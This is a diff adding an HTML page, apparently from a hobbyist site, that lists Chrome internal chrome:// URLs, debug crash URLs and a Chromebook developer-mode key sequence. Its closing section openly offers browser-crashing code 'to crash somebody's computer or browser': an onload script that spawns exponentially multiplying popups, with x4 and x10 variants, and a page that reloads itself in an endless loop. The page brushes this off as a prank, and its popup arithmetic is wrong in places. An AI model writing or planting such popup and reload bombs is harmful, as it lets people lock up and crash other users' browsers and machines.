@@ -1,0 +1,421 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Chrome | Commands and Scripts</title>
+  <meta charset="utf-8">
+  <meta name="description" content="Chrome Features and Info [BETA]"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="./style/style1.css">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+  <head>
+  <link rel="icon" href="chromelogo.png" type="imageX" sizes="16x16">
+  <dialog></dialog>
+</head>
+<head>
+    <script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
+</head>
+  <style>
+    /* Remove the navbar's default margin-bottom and rounded borders */ 
+    .navbar {
+      margin-bottom: 0;
+      border-radius: 0;
+    }
+    
+    /* Set height of the grid so .sidenav can be 100% (adjust as needed) */
+    .row.content {height: 450px}
+    
+    /* Set gray background color and 100% height */
+    .sidenav {
+      padding-top: 20px;
+      background-color: #fff;
+      height: 100%;
+    }
+    
+    /* Set black background color, white text and some padding */
+    footer {
+      background-color: #555;
+      color: white;
+      padding: 15px;
+    }
+    
+    /* On small screens, set height to 'auto' for sidenav and grid */
+    @media screen and (max-width: 767px) {
+      .sidenav {
+        height: auto;
+        padding: 15px;
+      }
+      .row.content {height:auto;} 
+    }
+
+h5 {
+  color: #7a0000;
+}
+p1 {
+  color: #e30000;
+}
+.dropbtn {
+  background-color: #222222;
+  color: gray;
+  padding: 16px;
+  font-size: 16px;
+  border: none;
+  cursor: pointer;
+}
+
+.dropdown {
+  position: relative;
+  display: inline-block;
+}
+
+.dropdown-content {
+  display: none;
+  position: absolute;
+  background-color: #f9f9f9;
+  min-width: 160px;
+  box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
+  z-index: 1;
+}
+
+.dropdown-content a {
+  color: black;
+  padding: 12px 16px;
+  text-decoration: none;
+  display: block;
+}
+
+.dropdown-content a:hover {background-color: #f1f1f1}
+
+.dropdown:hover .dropdown-content {
+  display: block;
+}
+
+.dropdown:hover .dropbtn {
+  background-color: #222;
+}
+  </style>
+</head>
+<body>
+
+<nav class="navbar navbar-inverse">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>                        
+      </button>
+      <img src="image.png" alt="" style="width:140px;height:45px;">
+    </div>
+    <div class="collapse navbar-collapse" id="myNavbar">
+      <ul class="nav navbar-nav">
+        <li><a href="#"></a></li>
+        <li class="active"><a href="index.html">chrome://</a></li>
+        <li><a href="aitest.html">AI Browser Test</a></li>
+        <li><a href="code.html">Binary Code</a></li>
+        <li><a href="search.html">Search Browser</a></li>
+        <div class="dropdown">
+        <button class="dropbtn">Others</button>
+  <div class="dropdown-content">
+  <hr>
+  <li><h5 class="dropdown-header">System Info</h5></li>
+  <li><a class="dropdown-item" href="ks.html">Keyboard Shortcuts</a></li>
+  <li><a class="dropdown-item" href="cs.html">Character Sets</a></li>
+  <li><a class="dropdown-item" href="errorcodes.html">Error Codes</a></li>
+  <li><a class="dropdown-item" href="chromeplugins.html">Plug-ins</a></li>
+  <li><a class="dropdown-item" href="#">-</a></li>
+  <hr>
+  <li><h5 class="dropdown-header">Other</h5></li>
+  <li><a class="dropdown-item" href="server.html">Server</a></li>
+  <li><a class="dropdown-item" href="ceditor.html">Code Editor</a></li>
+  <li><a class="dropdown-item" href="buglist.html">CC/S Bug List</a></li>
+  <hr>
+  <li><h5 class="dropdown-header">Miscellaneous</h5></li>
+  <li><a class="dropdown-item" href="pixelart.html">Pixel Art</a></li>
+  <li><a class="dropdown-item" href="paint.html">Canvas</a></li>
+  <hr>
+  </div>
+</div>
+</ul>
+      <ul class="nav navbar-nav navbar-right">
+      <li><a href="sl.html" id="lang" data-toggle="tooltip" data-placement="bottom" title="System Lang"></a></li>
+<li><a href="wc.html" id="code" data-toggle="tooltip" data-placement="bottom" title="Web Code"></a></li>
+
+<script>
+document.getElementById("code").innerHTML = 
+"" + navigator.appCodeName;
+</script>
+
+<li><a href="na.html" id="app" data-toggle="tooltip" data-placement="bottom" title="Nav App"></a></li>
+<script>
+document.getElementById("app").innerHTML = 
+"" + navigator.appName;
+</script>
+
+<script>
+document.getElementById("lang").innerHTML =
+"" + navigator.language;
+</script></li></a>
+</a></li>
+
+<li><a href="nb.html" id="browser" data-toggle="tooltip" data-placement="bottom" title="Nav Browser "></a></li>
+<script>
+document.getElementById("browser").innerHTML =
+"" + navigator.product;
+</script>
+<li><a href="ud.html" id="device" data-toggle="tooltip" data-placement="bottom" title="User Device"></a></li>
+<script>
+document.getElementById("device").innerHTML = 
+"" + navigator.platform;
+</script>
+<li><a href="tz.html" id="clock" data-toggle="tooltip" data-placement="bottom" title="System Clock">JavaScript Is Not Enabled</a></li>
+        <div id="clock"></div>
+<script type="text/javascript">
+function updateclock(){
+    ourDate = new Date();
+    document.getElementById("clock").innerHTML = ourDate.toLocaleString();
+}
+
+function startclock() {
+    updateclock();
+    setInterval(updateclock, 1000); 
+}
+startclock();
+    </script></li>
+      </ul>
+    </div>
+  </div>
+</nav>
+  
+<div class="container-fluid text-center">    
+  <div class="row content">
+    <div class="col-sm-2 sidenav">
+    </div>
+    <div class="col-sm-8 text-left"> 
+      <h1><b>Chrome Commands/Scripts:</b></h1>
+      <h4><b>Info:</b> If the nav bar looks off to you please press, 'ctrl' and '+', Thank you.</h4>
+      <h5><b>Error:</b>The dropdown appers below the 'chrome://' button for MAC, and off centered for other platforms.</h5>
+      <hr>
+      <input type="button" value="<" onclick="openWin()" class="btn">
+<script>
+function goBack() {
+  window.history.back()
+}
+</script>
+<body>
+
+<input type="button" value="Back" onclick="goBack()" class="btn">
+<script>
+function goForward() {
+  window.history.forward()
+}
+</script>
+</head>
+<input class="btn" type="button" value="Reload" onclick="newDoc()">
+
+<script>
+function newDoc() {
+  window.location.assign("https://dev--chromehiddenfiles.spiritnova0014.autocode.gg/chromeurls.html")
+}
+</script>
+<body>
+
+<input type="button" value="Forward" onclick="goForward()"class="btn">
+<hr>
+<body>
+<h4><b>Developer Mode</b></h4>
+<div class="container">
+<p>'esc' + 'reload' key + 'power' button on the side of your chromebook, will open up the dev menu.</p>
+<p>then you press 'ctrl' + 'd' to move on from the "Water Damage/Recovery" page</p>
+</div>
+<hr>
+<h4><b>Chrome:// </b></h4>
+<div class="container">
+<p>chrome://about</p>
+<p>chrome://accessibility</p>
+<p>chrome://appcache-internals</p>
+<p>chrome://assistant-optin</p>
+<p>chrome://autofill-internals</p>
+<p>chrome://blob-internals</p>
+<p>chrome://bluetooth-internals</p>
+<p>chrome://bookmarks</p>
+<p>chrome://certificate-manager</p>
+<p>chrome://chrome-urls</p>
+<p>chrome://components</p>
+<p>chrome://conversion-internals</p>
+<p>chrome://crashes</p>
+<p>chrome://credits</p>
+<p>chrome://crostini-credits</p>
+<p>chrome://cryptohome</p>
+<p>chrome://device-log</p>
+<p>chrome://devices</p>
+<p>chrome://dino</p>
+<p>chrome://discards</p>
+<p>chrome://download-internals</p>
+<p>chrome://downloads</p>
+<p>chrome://drive-internals</p>
+<p>chrome://extensions</p>
+<p>chrome://family-link-user-internals</p>
+<p>chrome://flags</p>
+<p>chrome://floc-internals</p>
+<p>chrome://gcm-internals</p>
+<p>chrome://gpu</p>
+<p>chrome://help</p>
+<p>chrome://histograms</p>
+<p>chrome://history</p>
+<p>chrome://indexeddb-internals</p>
+<p>chrome://inspect</p>
+<p>chrome://internet-config-dialog</p>
+<p>chrome://internet-detail-dialog</p>
+<p>chrome://interstitials</p>
+<p>chrome://invalidations</p>
+<p>chrome://linux-proxy-config</p>
+<p>chrome://local-state</p>
+<p>chrome://lock-network</p>
+<p>chrome://management</p>
+<p>chrome://media-engagement</p>
+<p>chrome://media-internals</p>
+<p>chrome://nacl</p>
+<p>chrome://net-export</p>
+<p>chrome://net-internals</p>
+<p>chrome://network</p>
+<p>chrome://network-error</p>
+<p>chrome://network-errors</p>
+<p>chrome://new-tab-page</p>
+<p>chrome://new-tab-page-third-party</p>
+<p>chrome://newtab</p>
+<p>chrome://ntp-tiles-internals</p>
+<p>chrome://omnibox</p>
+<p>chrome://oobe</p>
+<p>chrome://os-credits</p>
+<p>chrome://os-settings</p>
+<p>chrome://password-manager-internals</p>
+<p>chrome://policy</p>
+<p>chrome://power</p>
+<p>chrome://predictors</p>
+<p>chrome://prefs-internals</p>
+<p>chrome://print</p>
+<p>chrome://process-internals</p>
+<p>chrome://quota-internals</p>
+<p>chrome://safe-browsing</p>
+<p>chrome://sandbox</p>
+<p>chrome://serviceworker-internals</p>
+<p>chrome://settings</p>
+<p>chrome://signin-internals</p>
+<p>chrome://site-engagement</p>
+<p>chrome://sync-internals</p>
+<p>chrome://sys-internals</p>
+<p>chrome://system</p>
+<p>chrome://terms</p>
+<p>chrome://tracing</p>
+<p>chrome://translate-internals</p>
+<p>chrome://ukm</p>
+<p>chrome://usb-internals</p>
+<p>chrome://user-actions</p>
+<p>chrome://version</p>
+<p>chrome://web-app-internals</p>
+<p>chrome://webrtc-internals</p>
+<p>chrome://webrtc-logs</p>
+<p>chrome://whats-new</p>
+</div>
+<hr>
+<h3>List of chrome://internals pages</h3>
+<p>chrome://internals/session-service</p>
+<hr>
+<h4><b>Debug chrome://</b></h4>
+<p><b>NOTE:</b>The following pages are for debugging purposes only. Because they crash or hang the renderer, they're not linked directly; you can type them into the address bar if you need them.</p>
+<div class="container">
+<h5>chrome://badcastcrash/</h5>
+<h5>chrome://inducebrowsercrashforrealz/</h5>
+<h5>chrome://crash/</h5>
+<h5>chrome://crashdump/</h5>
+<h5>chrome://kill/</h5>
+<h5>chrome://hang/</h5>
+<h5>chrome://shorthang/</h5>
+<h5>chrome://gpuclean/</h5>
+<h5>chrome://gpucrash/</h5>
+<h5>chrome://gpuhang/</h5>
+<h5>chrome://memory-exhaust/</h5>
+<h5>chrome://memory-pressure-critical/</h5>
+<h5>chrome://memory-pressure-moderate/</h5>
+<h5>chrome://ppapiflashcrash/</h5>
+<h5>chrome://ppapiflashhang/</h5>
+<h5>chrome://webuijserror/</h5>
+<h5>chrome://quit/</h5>
+<h5>chrome://restart/</h5>
+</div>
+  <hr>
+<p>You can redirect to a chrome:// page you just need to create an extension with the tabs permission. Then you can use chrome. tabs.update({ url: "chrome://inducebrowsercrashforrealz") to redirect the current tab to chrome://inducebrowsercrashforrealz.<p>
+
+ <hr>
+ <h3><b>Other Info/Suff</b></h3>
+ 
+ <p>This will crash ANY browser or the computer using PopUps attack:</p>
+<p>If you want to crash somebodies computer or browser
+PopUp CODE that CRASHES a browser or computer</p>
+<b><p class="c0 c1">&lt;script type=&quot;text/javascript&quot;&gt; </span></p><p class="c0"><span class="c2">function CrashAndBurn(url) { popupWindow = window.open( url,&#39;popUpWindow&#39;,&#39;height=181,width=666,left=3,top=222&#39;) }</span></p><p class="c0"><span class="c2">&lt;/script&gt; </span></p><p class="c0"><span class="c2">&lt;body onload=&quot;JavaScript:CrashAndBurn(self.location,&#39;_blank&#39;);
+<p><b>JavaScript:CrashAndBurn(self.location,&#39;_blank&#39;);&quot;&gt;</span></p><p class="c0 c1"><span class="c4"></span></p></body></b>
+<hr>
+<p>WARNING this will crash ANY browser or the computer using PopUps attack:
+If you want to crash somebody's computer or browser
+PopUp CODE that CRASHES a browser or computer</p>
+<hr>
+<b><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">&lt;script type=&quot;text/javascript&quot;&gt; </span></p><p class="c0"><span class="c2">function CrashAndBurn(url) { popupWindow = window.open( url,&#39;popUpWindow&#39;,&#39;height=181,width=666,left=3,top=222&#39;) }</span></p><p class="c0"><span class="c2">&lt;/script&gt; </span></p><p class="c0"><span class="c2">
+&lt;body onload=&quot;JavaScript:CrashAndBurn(self.location,&#39;_blank&#39;);
+<p>JavaScript:CrashAndBurn(self.location,&#39;_blank&#39;);&quot;&gt;</span></p><p class="c0 c1"><span class="c2"></span></p></b>
+<hr>
+
+<p>If you really want to make their browser seriously hang up, you use this popup. It will continue to upload with 2 more and 2 more popup pages for each popup. That means 2x2 pop ups a second time, 4 popups then 8, 16, 32, 64 and so on popups. It makes as if it were a virus that will spread PopUps in the browser, filling the screen with pop ups till either the computer or the browser crashes and hangs up and shuts down, just...</p>
+<b><p>NOTE: You did not hear this from me OKAY... LOL... I ONLY advise this as a piratical joke on a friend and not for an online web page.</p></b>
+<p>If you wish to make it crash faster then just add more JavaScript:CrashAndBurn(self.location,'_blank'); to onload body like this example x4:</p>
+<b><p class="c0">&lt;body onload=&quot;
+JavaScript:CrashAndBurn(self.location,&#39;_blank&#39;);
+JavaScript:CrashAndBurn(self.location,&#39;_blank&#39;);
+JavaScript:CrashAndBurn(self.location,&#39;_blank&#39;);
+JavaScript:CrashAndBurn(self.location,&#39;_blank&#39;);
+&quot;&gt;</span></p><p class="c0 c1"><span class="c4"></span></p><p class="c0 c1"><span class="c4"></span></p></b>
+<p>It will load 4 popups for each popup that means after 4 popups it will load 4x4 meaning 18 popups and then 18x4 that is 72 and then 72x4 that is 288 popups and then 288x4 that is 1152 popups just in 4 rounds of popups in a few seconds...</p>
+<p>And if you want to be EXTREME HORRIBLE then use x10 example:</p>
+<b><p class="c0 c1">
+onload=JavaScript:CrashAndBurn(self.location,&#39;_blank&#39;);
+JavaScript:CrashAndBurn(self.location,&#39;_blank&#39;);
+JavaScript:CrashAndBurn(self.location,&#39;_blank&#39;);
+JavaScript:CrashAndBurn(self.location,&#39;_blank&#39;);
+JavaScript:CrashAndBurn(self.location,&#39;_blank&#39;);
+JavaScript:CrashAndBurn(self.location,&#39;_blank&#39;);
+JavaScript:CrashAndBurn(self.location,&#39;_blank&#39;);
+JavaScript:CrashAndBurn(self.location,&#39;_blank&#39;);
+JavaScript:CrashAndBurn(self.location,&#39;_blank&#39;);
+JavaScript:CrashAndBurn(self.location,&#39;_blank&#39;);&quot;&gt;</span></p><p class="c0 c1"><span class="c4"></span></p></b>
+<p>and you have 8 pop ups with 10 that is 10x10=100 popups and then 1000 and after that 1 000 000 popups and GUARANTEES crash fast.</p>
+<hr>
+<p>Here the code all together….</p>
+<b><p class="c0"><span class="c2">&lt;!DOCTYPE html&gt;</span></p><p class="c0"><span class="c2">&lt;html&gt;</span></p><p class="c0"><span class="c2">&lt;body&gt;</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">&lt;h2&gt;Crashing Now&lt;/h2&gt;</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">&lt;p&gt;Hit Ok To Crash&lt;/p&gt;</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">&lt;script&gt;</span></p><p class="c0"><span class="c2">onbeforeunload = function(){localStorage.x=1};</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">if(confirm(&quot;Do you REALLY want me to crash your browser?&quot;)){</span></p><p class="c0"><span class="c2">&nbsp; setTimeout(function(){</span></p><p class="c0"><span class="c2">&nbsp; &nbsp; while(1)location.reload(1)</span></p><p class="c0"><span class="c2">&nbsp; }, 1000)</span></p><p class="c0"><span class="c2">}</span></p><p class="c0"><span class="c2">&lt;/script&gt;</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">&lt;/body&gt;</span></p><p class="c0"><span class="c2">&lt;/html&gt;</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0 c1"><span class="c16"></span></p></body></html>
+</b></b></b></b></b>
+</html>
+<script>
+$(document).ready(function(){
+  $('[data-toggle="tooltip"]').tooltip();   
+});
+</script>
+<script>
+var myWindow;
+function openWin() {
+  myWindow = window.open("https://spiritxiv.autocode.dev/chromehiddenfiles@xiv-websites/index.html", "https://spiritxiv.autocode.dev/chromehiddenfiles@xiv-websites/index.html", "width=1517, height=853");
+  myWindow.blur();
+}
+function blurWin() {
+  myWindow.blur();
+}
+function focusWin() {
+  myWindow.focus();
+}
+</script>
+</head>
+<body>
+</body>
